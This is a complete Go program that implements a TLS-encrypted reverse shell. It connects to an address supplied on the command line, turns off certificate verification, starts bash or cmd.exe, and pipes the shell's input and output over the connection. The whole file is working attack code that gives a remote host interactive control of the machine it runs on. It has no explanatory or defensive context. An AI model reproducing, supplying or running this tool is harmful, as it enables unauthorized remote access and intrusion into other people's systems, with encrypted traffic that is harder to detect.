package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
)

func main() {
	var (
		tlsconf = &tls.Config{
			InsecureSkipVerify: true,
		}
		closeSignal = make(chan bool)
		shell       = "/bin/bash"
	)

	if len(os.Args) != 2 {
		fmt.Println(os.Args[0], "ip:port")
		os.Exit(0)
	}

	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	}

	conn, err := tls.Dial("tcp", os.Args[1], tlsconf)
	checkError(err)

	cmd := exec.Command(shell)
	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	cmd.Start()

	go func() {
		defer conn.Close()
		defer stdin.Close()

		io.Copy(stdin, conn)
		closeSignal <- true
	}()

	go func() {
		defer conn.Close()
		defer stdout.Close()

		io.Copy(conn, stdout)
	}()

	go func() {
		defer conn.Close()
		defer stderr.Close()

		io.Copy(conn, stderr)
	}()

	<-closeSignal
}

func checkError(err error) {
	if err != nil {
		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
		os.Exit(1)
	}
}
